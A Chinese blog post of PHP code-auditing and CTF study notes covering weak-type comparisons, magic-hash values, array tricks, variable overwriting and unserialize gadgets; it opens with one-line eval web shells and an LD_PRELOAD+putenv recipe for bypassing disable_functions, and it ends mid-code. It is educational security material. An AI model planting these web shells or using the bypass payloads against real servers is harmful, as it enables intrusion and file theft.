      <a class="article-title" href="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">PHP代码审计</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Un要是0，而且不能为0；if($UN==0 and $UN)</p>
<p>un=0 and 1  或</p>
<p>un=”01123”</p>
<p> <code>&lt;?php phpinfo();?&gt;</code> </p>
<p><code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code></p>
<p> @eval(getallheaders()[‘Accept-Language’]); </p>
<h3 id="LD-PRELOAD-putenv-打一套组合拳，既能绕过-open-basedir，又能绕过-disable-functions"><a href="#LD-PRELOAD-putenv-打一套组合拳，既能绕过-open-basedir，又能绕过-disable-functions" class="headerlink" title="LD_PRELOAD+putenv 打一套组合拳，既能绕过 open basedir，又能绕过 disable functions"></a><code>LD_PRELOAD</code>+<code>putenv</code> 打一套组合拳，既能绕过 open basedir，又能绕过 disable functions</h3><p>LD_PRELOAD 与 putenv</p>
<p>即 LD_PRELOAD 这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用</p>
<p>而 putenv 可以设置环境变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv ( string $setting ) : bool</span><br></pre></td></tr></table></figure>

<p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p>
<p>同时该函数也未被过滤。那么我们可以有如下骚操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\1. 制作一个恶意 shared libraries</span><br><span class="line">\2. 使用 putenv 设置 LD_PRELOAD 为恶意文件路径</span><br><span class="line">\3. 使用某个 php 函数  phpmail() ，触发 specific shared library</span><br><span class="line">\4. 成功进行 RCE</span><br></pre></td></tr></table></figure>



<h3 id="绕过-open-basedir-限制操作文件的方法"><a href="#绕过-open-basedir-限制操作文件的方法" class="headerlink" title="绕过 open_basedir 限制操作文件的方法"></a>绕过 open_basedir 限制操作文件的方法</h3><p> <strong>命令执行函数</strong> </p>
<p> 由于 open_basedir 的设置对 system 等命令执行函数是无效的，所以我们可以使用命令执行函数来访问限制目录。 </p>
<p> 接下来我们用 system 函数尝试绕 open_basedir 的限制来删除 1.txt </p>
<p> 由于命令执行函数一般都会被限制在 disable_function 当中，所以我们需要寻找其他的途径来绕过限制。 </p>
<p> <strong>symlink () 函数</strong> </p>
<p> bool symlink ( string $target , string $link ) </p>
<p> symlink 函数将建立一个指向 target 的名为 link 的符号链接，当然一般情况下这个 target 是受限于 open_basedir 的。 </p>
<p>  <strong>glob 伪协议</strong> </p>
<p><a href="https://www.jb51.net/article/141767.htm" target="_blank" rel="noopener">https://www.jb51.net/article/141767.htm</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">【】is_numeric 当有两个is_numeric判断并用<span class="keyword">and</span>连接时，<span class="keyword">and</span>后面的is_numeric可以绕过</span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line">$b=<span class="string">"dfs"</span>;</span><br><span class="line">$c=is_numeric($a) <span class="keyword">and</span> is_numeric($b);</span><br><span class="line">var_dump(is_numeric($a));</span><br><span class="line">var_dump(is_numeric($b));</span><br><span class="line">var_dump($c); <span class="comment">//$b可以不是数字，同样返回true</span></span><br><span class="line">$test= <span class="keyword">true</span> <span class="keyword">and</span> <span class="keyword">false</span>;</span><br><span class="line">var_dump($test); <span class="comment">//返回true</span></span><br><span class="line">	is_numeric绕过</span><br><span class="line">空格、\t、\n、\r、\v、\f、+、-能够出现在参数开头，“点”能够在参数任何位置，E、e只能出现在参数中间。</span><br><span class="line">【】<span class="keyword">NULL</span>,<span class="number">0</span>,”<span class="number">0</span>″,<span class="keyword">array</span>()使用==和<span class="keyword">false</span>比较时，都是会返回<span class="keyword">true</span>的</span><br><span class="line"></span><br><span class="line">【】接收参数$a得存在，并且$a==<span class="number">0</span>可用.绕过（非数字都可绕过）</span><br><span class="line">测试代码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">if</span> ($a==<span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"1"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($a) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"must"</span>;</span><br><span class="line">&#125;</span><br><span class="line">【】php5,<span class="number">3</span>,<span class="number">29</span>,这里可以直接用%<span class="number">0</span>b绕过\s（空白字符）的匹配</span><br><span class="line">【】intval()函数。</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'42'</span>);                    <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'+42'</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'-42'</span>);                   <span class="comment">// -42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'042'</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">1e10</span>);                    <span class="comment">// 1410065408</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'1e10'</span>);                  <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">0x1A</span>);                    <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42000000</span>);                <span class="comment">// 42000000</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">420000000000000000000</span>);   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'420000000000000000000'</span>); <span class="comment">// 2147483647</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>, <span class="number">8</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'42'</span>, <span class="number">8</span>);                 <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>());                 <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">'foo'</span>, <span class="string">'bar'</span>));     <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">if</span>(intval($k1) !== $cc || $k1 === $cc)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lol no\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="keyword">array</span>()) = <span class="keyword">null</span></span><br><span class="line"></span><br><span class="line">sha1(<span class="keyword">array</span>()) = <span class="keyword">null</span></span><br></pre></td></tr></table></figure>



<h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727134527752.png" alt="image-20200727134527752" style="zoom:80%;">

<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727134638827.png" alt="image-20200727134638827" style="zoom:80%;">

<p>MD5大全：</p>
<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/0ve5tws5dm.jpeg" alt="0ve5tws5dm" style="zoom: 67%;">

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line">md5(CbDLytmyGm2xQyaLNhWn) &#x3D;&gt; 0ec20b7c66cafbcc7d8e8481f0653d18</span><br><span class="line">md5(md5(CbDLytmyGm2xQyaLNhWn)) &#x3D;&gt; 0e3a5f2a80db371d4610b8f940d296af</span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line">md5(770hQgrBOjrcqftrlaZk) &#x3D;&gt; 0e689b4f703bdc753be7e27b45cb3625</span><br><span class="line">md5(md5(770hQgrBOjrcqftrlaZk)) &#x3D;&gt; 0e2756da68ef740fd8f5a5c26cc45064</span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br><span class="line">md5(7r4lGXCH2Ksu2JNT3BYM) &#x3D;&gt; 0e269ab12da27d79a6626d91f34ae849</span><br><span class="line">md5(md5(7r4lGXCH2Ksu2JNT3BYM)) &#x3D;&gt; 0e48d320b2a97ab295f5c4694759889f</span><br><span class="line"></span><br><span class="line">0e215962017</span><br></pre></td></tr></table></figure>

<p>// 0e 开头会被当成数字，又是等于 0*10^xxx=0</p>
<p>// 如果 md5 是以 0e 开头，在做比较的时候，可以用这种方法绕过</p>
<p>‘0e509367213418206700842008763514’ == ‘0e481036490867661113260034900752’;</p>
<p>‘0e481036490867661113260034900752’ == ‘0’ ;</p>
<p>var_dump(md5(‘240610708’) == md5(‘QNKCDZO’));</p>
<p>var_dump(md5(‘aabg7XSs’) == md5(‘aabC9RqS’));</p>
<p>var_dump(sha1(‘aaroZmOk’) == sha1(‘aaK1STfY’));</p>
<p>var_dump(sha1(‘aaO8zKZF’) == sha1(‘aa3OFF9m’));</p>
<p>常见的payload有</p>
<p>  QNKCDZO</p>
<p>  240610708</p>
<p>  s878926199a</p>
<p>  s155964671a</p>
<p>  s214587387a</p>
<p>  s214587387a</p>
<p>   sha1(str)</p>
<p>  sha1(‘aaroZmOk’) </p>
<p>  sha1(‘aaK1STfY’)</p>
<p>  sha1(‘aaO8zKZF’)</p>
<p>  sha1(‘aa3OFF9m’)</p>
<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/clip_image002-1573826613926.jpg" alt="img" style="zoom:150%;">





<p>true = = “a”     布尔值true可以跟任何字符串匹配相等</p>
<p>·     ‘0xabcdef’==’11259375’ //true</p>
<p>·     当字符串开头不为0，那么字符串与数字匹配时被转为0（”a” = = 0）；</p>
<p>·     x=0.99999999999999999（小数点后至少有17位）即可满足x==’1’ and x= =’0’;</p>
<p>SHA1</p>
<p> 例子：<code>sha1($_GET[&#39;uname&#39;]) === sha1($_GET[&#39;passwd&#39;]</code></p>
<p>sha1比较数组漏洞： uname[]=1&amp;passwd[]=23 即可绕过 (注:数组数字可任意)</p>
<p>同时MD5不能处理数组，若有以下判断则可用数组绕过</p>
<p>if(@md5($_GET[‘a’]) == @md5($_GET[‘b’]))</p>
<p>{</p>
<p>  echo “yes”;</p>
<p>}</p>
<p>//<a href="http://127.0.0.1/1.php?a[]=1&amp;b[]=2" target="_blank" rel="noopener">http://127.0.0.1/1.php?a[]=1&amp;b[]=2</a></p>
<p>if (@sha1([]) == false)</p>
<p>  echo 1;</p>
<p>if (@md5([]) == false)</p>
<p>  echo 2;</p>
<p>echo var_dump(@sha1([]));</p>
<p>返回值为NULL</p>
<h3 id="Strops"><a href="#Strops" class="headerlink" title="Strops"></a>Strops</h3><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p>
<p> strpos() 函数对大小写敏感。</p>
<p> 该函数是二进制安全的。</p>
<p> <code>strpos(string, find, start)</code> <em>string</em> 和 <em>find</em> 必需，<em>start</em> 可选，规定在何处开始搜索。</p>
<p>查找”touch”在字符串中第一次出现的位置：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\<span class="number">1.</span>    <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">\<span class="number">2.</span>      <span class="keyword">echo</span> strpos(<span class="string">"love is a touch and yet not a touch"</span>, <span class="string">"touch"</span>)</span><br><span class="line"></span><br><span class="line">\<span class="number">3.</span>    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> <strong>stripos()</strong> - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</p>
<p> <strong>strripos()</strong> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</p>
<p> <strong>strrpos()</strong> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</p>
<p><code>strpos(array(),&quot;abc&quot;) = null</code></p>
<h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>判断的时候是不能用 <em>!= false</em>来判断的，因为当查找的字符串位置为0 时也会判断成功</p>
<p>\1.    &lt;?php </p>
<p>\2.    $a = “stark”;</p>
<p>\3.    $b = “s”;</p>
<p>\4.    $c = “k”;</p>
<p>\5.     </p>
<p>\6.    var_dump(strpos($a, $b));</p>
<p>\7.    var_dump(strpos($a, $c));</p>
<p>\8.    var_dump(strpos($a, $b) != false);</p>
<p>\9.    var_dump(strpos($a, $b) !== false);</p>
<p>\10.  ?&gt;</p>
<h3 id="ereg函数漏洞-00截断"><a href="#ereg函数漏洞-00截断" class="headerlink" title="ereg函数漏洞   00截断"></a>ereg函数漏洞   00截断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+[        DISCUZ_CODE_2        ]quot;, $_GET['password']) === FALSE)  </span></span><br><span class="line"><span class="string">        echo 'You password must be alphanumeric';  </span></span><br><span class="line"><span class="string">    else if (strpos ($_GET['password'], '--') !== FALSE)  </span></span><br><span class="line"><span class="string">        die('Flag: ' . $flag);  </span></span><br><span class="line"><span class="string">    else  </span></span><br><span class="line"><span class="string">        echo 'Invalid password';  </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p><code>ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE</code></p>
<p>字符串对比解析 </p>
<p>1.在这里如果 $_GET[‘password’]为数组，则ereg返回值为NULL </p>
<p><code>?nctf[]=aa</code></p>
<p>2.如果为123 || asd || 12as || 123%00&amp;&amp;&amp;**，则返回值为true    ereg读到%00的时候，就截止了，所以可以构造s%00–</p>
<p><code>?nctf=111%00%23biubiubiu</code></p>
<p>其余为false</p>
<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><h2 id="可变变量引起的变量覆盖"><a href="#可变变量引起的变量覆盖" class="headerlink" title="可变变量引起的变量覆盖"></a>可变变量引起的变量覆盖</h2><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727135134930.png" alt="image-20200727135134930" style="zoom:80%;">

<h2 id="函数引起的变量覆盖"><a href="#函数引起的变量覆盖" class="headerlink" title="函数引起的变量覆盖"></a>函数引起的变量覆盖</h2><h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖</p>
<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727135342461.png" alt="image-20200727135342461" style="zoom:80%;">

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    $auth = <span class="string">'0'</span>;  </span><br><span class="line">    <span class="comment">// 这里可以覆盖$auth的变量值</span></span><br><span class="line">    extract($_GET);       传auth=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>($auth == <span class="number">1</span>)&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"private!"</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"public!"</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$a=<span class="string">'hi'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;  传</span><br><span class="line">        <span class="keyword">echo</span> $key;</span><br><span class="line">        $$key = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str 变量覆盖"></a>parse_str 变量覆盖</h3><p>与 parse_str() 类似的函数还有 mb_parse_str()，</p>
<p>parse_str 将字符串解析成多个变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</p>
<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727140444804.png" alt="image-20200727140444804" style="zoom:80%;">

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;var.php?var&#x3D;new  </span><br><span class="line">$var&#x3D;&#39;init&#39;;  </span><br><span class="line">parse_str($_SERVER[&#39;QUERY_STRING&#39;]);  </span><br><span class="line">print $var;</span><br><span class="line"> </span><br><span class="line">parse_url()</span><br><span class="line">parse_url()的小trick，通过：&#39;&#x2F;&#x2F;&#x2F;x.php?key&#x3D;value&#39;的方式可以使其返回&#39;NULL&#39;，或者xxxx&#x2F;&#x2F;&#x2F;serialized&#x2F;index.php ?file&#x3D;hint.php，必须作用在域名根目录下。漏洞问题只存在于php5.4.7以后存在此漏洞。</span><br></pre></td></tr></table></figure>

<h2 id="13-switch"><a href="#13-switch" class="headerlink" title="13.switch()"></a>13.switch()</h2><p>如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$i &#x3D;&quot;2abc&quot;;  </span><br><span class="line">switch ($i) &#123;  </span><br><span class="line">case 0:  </span><br><span class="line">case 1:  </span><br><span class="line">case 2:  </span><br><span class="line">echo &quot;i is less than 3 but not negative&quot;;  </span><br><span class="line">break;  </span><br><span class="line">case 3:  </span><br><span class="line">echo &quot;i is 3&quot;;  </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这个时候程序输出的是i is less than 3 but not negative，是由于switch()函数将$i进行了类型转换，转换结果为2。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure>

<h2 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h2><p>unset(<em>bar</em>);用来销毁指定的变量，如果变量 bar);用来销毁指定的变量，如果变量  bar); 用来销毁指定的变量，如果变量  bar 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?_CONFIG&#x3D;123</span><br><span class="line">$_CONFIG[&#39;extraSecure&#39;] &#x3D; true;</span><br><span class="line"> </span><br><span class="line">foreach(array(&#39;_GET&#39;,&#39;_POST&#39;) as $method) &#123;</span><br><span class="line">    foreach($$method as $key&#x3D;&gt;$value) &#123;</span><br><span class="line">      &#x2F;&#x2F; $key &#x3D;&#x3D; _CONFIG</span><br><span class="line">      &#x2F;&#x2F; $$key &#x3D;&#x3D; $_CONFIG</span><br><span class="line">      &#x2F;&#x2F; 这个函数会把 $_CONFIG 变量销毁</span><br><span class="line">      unset($$key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if ($_CONFIG[&#39;extraSecure&#39;] &#x3D;&#x3D; false) &#123;</span><br><span class="line">    echo &#39;flag &#123;****&#125;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="14-in-array"><a href="#14-in-array" class="headerlink" title="14.in_array()"></a>14.in_array()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$array&#x3D;[0,1,2,&#39;3&#39;];  </span><br><span class="line">var_dump(in_array(&#39;abc&#39;, $array)); &#x2F;&#x2F;true  </span><br><span class="line">var_dump(in_array(&#39;1bc&#39;, $array)); &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>

<p>可以看到上面的情况返回的都是true,因为’abc’会转换为0，’1bc’转换为1。<br> 在所有php认为是int的地方输入string，都会被强制转换</p>
<h1 id="serialize-和-unserialize漏洞"><a href="#serialize-和-unserialize漏洞" class="headerlink" title="serialize 和 unserialize漏洞"></a>serialize 和 unserialize漏洞</h1><p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727140634702.png" alt="image-20200727140634702"></p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727141000354.png" alt="image-20200727141000354"></p>
<p><img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727141021854.png" alt="image-20200727141021854"></p>
<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727141338982.png" alt="image-20200727141338982" style="zoom:80%;">

<img src="/2019/11/15/3%20PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200727141658558.png" alt="image-20200727141658558" style="zoom:80%;">

<p>魔术方法</p>
<p>这里我们先简单介绍一下php中的魔术方法（这里如果对于类、对象、方法不熟的先去学学吧），即Magic方法，php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号<strong>开头的，比如 __construct， __destruct，</strong>toString，<strong>sleep，</strong>wakeup等等。这些函数都会在某些特殊时候被自动调用。<br> 例如<strong>construct()方法会在一个对象被创建时自动调用，对应的</strong>destruct则会在一个对象被销毁时调用等等。<br> 这里有两个比较特别的Magic方法，__sleep 方法会在一个对象被序列化的时候调用。 __wakeup方法会在一个对象被反序列化的时候调用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">out</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"username: "</span>.<span class="keyword">$this</span>-&gt;username.<span class="string">"&lt;br&gt;"</span>.<span class="string">"password: "</span>.<span class="keyword">$this</span>-&gt;password ;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> test();</span><br><span class="line">$a-&gt;file = <span class="string">'D:\app\phpstudy_pro\WWW\flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">"username"</span>;s:<span class="number">0</span>:<span class="string">""</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;s:<span class="number">0</span>:<span class="string">""</span>;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">32</span>:<span class="string">"D:\app\phpstudy_pro\WWW\flag.php"</span>;&#125;</span><br><span class="line"><span class="comment">//tostring方法会在输出实例的时候执行，如果实例路径是隐秘文件就可以读取了</span></span><br></pre></td></tr></table></figure>

<p>下面就可以读取了C:\Users\YZ\Desktop\plan.txt文件了<br> <strong>echo unserialize触发了__tostring函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">out</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"username: "</span>.<span class="keyword">$this</span>-&gt;username.<span class="string">"&lt;br&gt;"</span>.<span class="string">"password: "</span>.<span class="keyword">$this</span>-&gt;password ;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span 